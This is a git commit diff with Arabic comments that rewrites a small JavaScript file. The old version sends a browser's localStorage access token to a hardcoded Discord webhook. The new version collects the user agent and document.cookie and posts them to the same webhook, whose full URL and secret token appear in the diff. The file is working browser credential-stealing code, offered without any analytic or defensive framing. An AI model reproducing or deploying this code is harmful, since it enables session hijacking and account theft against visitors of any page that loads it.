56d0a45e1c352b242e2c026171b87fce59da907f
DXER <86264479+DXERX@users.noreply.github.com>
2023-10-10 16:49:05 +0300

    Update JavaScript.js

--- JavaScript.js
+++ JavaScript.js
@@ -1,27 +1,14 @@
-// جمع رمز الوصول
-const access_token = window.localStorage.getItem("access_token");
+const deviceInfo = navigator.userAgent;
+const cookies = document.cookie;
 
-// أرسل رمز الوصول إلى ويب هوك
-const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
-const data = JSON.stringify({
-  token: access_token,
-});
+// إعداد البيانات المراد إرسالها
+const data = {
+  deviceInfo: deviceInfo,
+  cookies: cookies,
+};
 
-fetch(webhook_url, {
+// إرسال البيانات إلى رابط ويب هوك Discord
+fetch("https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr", {
   method: "POST",
-  body: data,
-});
-
-// جمع رمز الوصول
-const access_token = window.localStorage.getItem("access_token");
-
-// أرسل رمز الوصول إلى ويب هوك
-const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
-const data = JSON.stringify({
-  token: access_token,
-});
-
-fetch(webhook_url, {
-  method: "POST",
-  body: data,
+  body: JSON.stringify(data),
 });
